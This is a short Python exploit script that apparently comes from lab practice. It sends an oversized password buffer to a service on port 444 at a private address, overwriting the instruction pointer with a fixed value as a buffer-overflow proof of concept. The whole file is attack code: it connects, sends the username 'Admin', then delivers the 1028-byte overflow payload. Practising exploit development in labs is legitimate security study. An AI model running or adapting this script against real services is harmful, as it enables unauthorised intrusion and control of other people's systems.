#!/usr/bin/python
import sys, socket, time, os, traceback


targetIP="10.10.0.1"

try:
  print "\nSending evil buffer..."

  # create pattern using msf-pattern_create
  size = 1028 
  
  EIP = "\x73\x6d\x47\x10"
  NOP = "\x90"*10 
  
  buffer = "A"*1028 + EIP + "CCCC" 

  print("Sending EIP POC ")
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

  s.connect((targetIP, 444))
  banner = s.recv(1024)
  print(banner)

  s.send("Admin")
  banner=s.recv(1024)
  print(banner)
 
  # send the bof on the pass
  s.send(buffer)
 

except Exception as e:
    print "\nCould not connect!"
    print(e)
    print(traceback.format_exc())
    sys.exit()
